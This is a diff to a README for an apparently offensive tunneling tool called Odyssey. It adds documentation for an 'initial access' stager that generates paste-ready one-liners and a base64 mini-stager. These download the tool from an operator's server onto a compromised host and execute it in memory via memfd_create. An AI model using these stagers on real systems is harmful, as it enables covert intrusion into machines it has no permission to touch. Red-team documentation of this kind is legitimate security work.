@@ -45,6 +45,12 @@ TCP and UDP relay, reverse tunneling with multiplexing, SOCKS5 proxy, TLS/mTLS t
 - **Killswitch.** Instantly stop all data-plane forwarding.
 - **Runtime snapshot.** Export full node state (routes, policies, streams, killswitch) for diagnostics.
 
+### Stager (initial access)
+
+- **Stager server.** `odyssey stager-server` serves the Odyssey binary over a raw TCP socket. Supports optional token authentication and single-use mode.
+- **One-liner generator.** `odyssey stager --format oneliner` prints a ready-to-paste one-liner that downloads and executes Odyssey. Linux (~85 chars, bash `/dev/tcp`) and Windows (~285 chars, PowerShell `TcpClient`).
+- **Base64 mini-stager.** `odyssey stager --format base64` generates ~13 lines of base64 encoding a pre-compiled mini-stager (~18 KB) patched with the server address and token. The mini-stager authenticates, downloads Odyssey, and executes it in memory via `memfd_create` (Linux >= 3.17).
+
 ### Cross-platform
 
 - Linux (native, primary target).
@@ -206,6 +212,39 @@ odyssey admin --connect 127.0.0.1:9002 --token-file ./admin_token.txt route-add 
 odyssey admin --connect 127.0.0.1:9002 --token-file ./admin_token.txt killswitch on
 odyssey admin --connect 127.0.0.1:9002 --token-file ./admin_token.txt snapshot
 ```
+
+### 6. Stager (deploy Odyssey on a target)
+
+**Option A: one-liner (needs TCP to stager-server)**
+
+```bash
+# Operator serves the binary
+./bin/odyssey stager-server \
+  --listen 0.0.0.0:4444 \
+  --binary ./bin/odyssey \
+  --no-auth --single-use --verbose
+
+# Generate the one-liner
+./bin/odyssey stager --connect 203.0.113.10:4444 --os linux --format oneliner \
+  --run-args "relay --listen 0.0.0.0:8080 --to 198.51.100.2:80"
+```
+
+Paste the output on the compromised host. Odyssey downloads and starts relaying.
+
+**Option B: base64 mini-stager (token auth, memfd)**
+
+```bash
+# Operator starts stager-server with token
+./bin/odyssey stager-server --listen 0.0.0.0:5555 --binary ./bin/odyssey \
+  --token "my-secret-token" \
+  --args "relay --listen 0.0.0.0:8080 --to 198.51.100.2:80" --single-use
+
+# Generate the mini-stager
+./bin/odyssey stager --connect 203.0.113.10:5555 --os linux --format base64 \
+  --token "my-secret-token"
+```
+
+Paste the output (~13 lines) on the target. The mini-stager authenticates, downloads Odyssey, and runs it in memory.
 
 ## Usage examples
 
